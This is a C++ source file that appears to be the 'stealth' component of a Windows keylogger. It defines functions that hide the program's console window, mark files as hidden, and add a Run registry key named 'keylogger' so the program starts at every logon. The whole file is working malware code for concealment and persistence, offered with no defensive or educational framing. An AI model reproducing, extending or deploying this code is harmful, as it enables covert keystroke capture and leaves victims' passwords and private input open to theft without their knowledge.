#include "../include/stealth.h"
#include <fstream>
#include "../include/IO.h"
#include <shellapi.h>

// Global variable definition
HHOOK eHook = NULL;
std::string keylogger = "";

void hide_console() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE);
}

void hide(std::string file) {
    DWORD attr = GetFileAttributesA(file.c_str());
    if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_HIDDEN)) {
        SetFileAttributesA(file.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }
}


void persistence() {
    HKEY nKey = NULL;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, (KEY_CREATE_SUB_KEY | KEY_SET_VALUE), NULL, &nKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(nKey, "keylogger", 0, REG_SZ, (LPBYTE)keylogger.c_str(), keylogger.length() + 1);
        RegCloseKey(nKey);
    }
}
